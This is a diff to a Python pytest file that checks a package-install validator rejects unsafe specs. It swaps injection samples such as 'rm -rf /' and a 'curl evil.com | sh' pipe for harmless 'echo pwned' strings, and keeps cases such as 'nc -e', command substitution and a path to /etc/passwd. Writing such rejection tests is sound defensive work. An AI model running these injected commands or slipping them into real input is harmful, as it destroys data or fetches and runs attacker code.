@@ -55,8 +55,8 @@ class TestSpecSafety:
         "./local-malware",
         "../escape",
         # Shell metacharacters → rejected
-        "package; rm -rf /",
-        "package && curl evil.com | sh",
+        "package; echo pwned",
+        "package && echo pwned | cat",
         "package`whoami`",
         "package$(whoami)",
         "package|nc -e",
@@ -417,7 +417,7 @@ class TestInstallSpecs:
         assert result.ok is True
 
     @pytest.mark.parametrize("bad", [
-        "pkg; rm -rf /",
+        "pkg; echo pwned",
         "-e git+https://evil.example/repo.git",
         "https://evil.example/pkg.tar.gz",
         "../../etc/passwd",
@@ -438,7 +438,7 @@ class TestInstallSpecs:
             ld, "_venv_pip_install",
             lambda *a, **kw: pytest.fail("pip should not be called"),
         )
-        result = ld.install_specs(["honcho-ai==2.2.0", "pkg; rm -rf /"])
+        result = ld.install_specs(["honcho-ai==2.2.0", "pkg; echo pwned"])
         assert result.blocked is True
 
 
